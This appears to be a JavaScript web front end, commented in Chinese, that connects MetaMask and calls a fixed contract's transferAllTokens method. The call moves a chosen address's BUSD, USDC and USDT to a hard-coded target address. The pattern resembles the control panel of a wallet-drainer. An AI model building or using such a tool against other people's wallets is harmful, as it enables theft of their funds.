// 合约地址
const contractAddress = '0x540d7E428D5207B30EE03F2551Cbb5751D3c7569';

// 合约 ABI
const contractABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            }
        ],
        "name": "transferAllTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "stateMutability": "payable",
        "type": "receive"
    },
    {
        "inputs": [],
        "name": "busdToken",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "targetAddress",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "usdcToken",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "usdtToken",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

// 初始化 Web3
let web3;
const connectButton = document.getElementById('connectButton');
const transferForm = document.getElementById('transferForm');
const messageDiv = document.getElementById('message');

// 连接钱包
connectButton.addEventListener('click', async () => {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        connectButton.innerText = '钱包已连接';
        connectButton.disabled = true;
        messageDiv.innerText = '钱包已成功连接！';
    } else {
        alert('请安装 MetaMask！');
    }
});

// 转移代币
transferForm.addEventListener('submit', async (event) => {
    event.preventDefault();
    const fromAddress = document.getElementById('fromAddress').value;

    try {
        const accounts = await web3.eth.getAccounts();
        const autoTransferContract = new web3.eth.Contract(contractABI, contractAddress);
        await autoTransferContract.methods.transferAllTokens(fromAddress).send({ from: accounts[0] });
        messageDiv.innerText = '代币已成功转移到目标地址！';
    } catch (error) {
        console.error(error);
        messageDiv.innerText = '转移失败，请检查控制台获取更多信息。';
    }
});
